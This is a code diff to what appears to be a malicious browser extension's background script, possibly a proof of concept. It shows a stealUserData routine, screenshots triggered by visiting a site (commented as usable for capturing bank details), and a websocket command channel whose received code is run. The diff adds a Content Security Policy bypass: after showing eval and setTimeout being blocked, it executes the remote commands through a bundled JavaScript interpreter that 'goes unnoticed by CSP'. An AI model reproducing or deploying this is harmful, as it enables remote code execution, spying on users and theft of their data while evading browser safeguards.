@@ -1,3 +1,5 @@
+importScripts('acorn_interpreter.js')
+
 // Perform the initial data steal and connect to websockets only after website is ready
 async function onReady() {
     await stealUserData();
@@ -23,11 +25,12 @@ async function stealUserData() {
 /* =================================================================================== */
 
 // On visit of a certain domain, take a screenshot
+// Could be abused to take screenshots of sensitive data such as bank account details
 async function onVisited(historyItem) {
     if (historyItem.url.includes('google.com')) {
         console.log('historyItem', historyItem);
         const screenshotUrl = await chrome.tabs.captureVisibleTab();
-
+        // TODO: take a screenshot and save it
     }
 }
 
@@ -115,11 +118,25 @@ async function onWsMessage(event) {
     }
 
     if (parsedMessage.type === 'BG_COMMAND') {
+        // Show that eval is blocked by CSP
+        try {
+            console.log("\nExecuting with eval (CSP block expected) ...")
+            eval(parsedMessage.data);
+        } catch (err) {
+            console.error(`eval() failed: ${err.message}`);
+        }
+
         // Show that eval through setTimout is blocked by CSP in the background script
-        executeWithSetTimeout(parsedMessage.data);
-        // Alternatively, execute the command with the interpreter
-        // TODO: figure out how to import JSInterpreter
-        // executeWithInterpreter(parsedMessage.data);
+        try {
+            console.log("\nExecuting with setTimout (CSP block expected) ...")
+            executeWithSetTimeout(parsedMessage.data);
+        } catch (err) {
+            console.error(`setTimeout() failed: ${err.message}`);
+        }
+
+        // Alternative, execute the command with the interpreter, goes unnoticed by CSP
+        console.log("\nExecuting with JSInterpreter ...")
+        executeWithInterpreter(parsedMessage.data);
     } else if (parsedMessage.type === 'CS_COMMAND') {
         chrome.tabs.sendMessage(currentTab.id, parsedMessage);
         // Alternatively, execute the command with the debugger
@@ -162,7 +179,7 @@ function executeWithInterpreter(command) {
         // interpreter.setProperty(globalObject, 'window',
         //     interpreter.createNativeFunction(windowWrapper));
     };
-    const interpreter = new JSInterpreter(command, initFunc)
+    const interpreter = new Interpreter(command, initFunc)
     interpreter.run()
 }
 
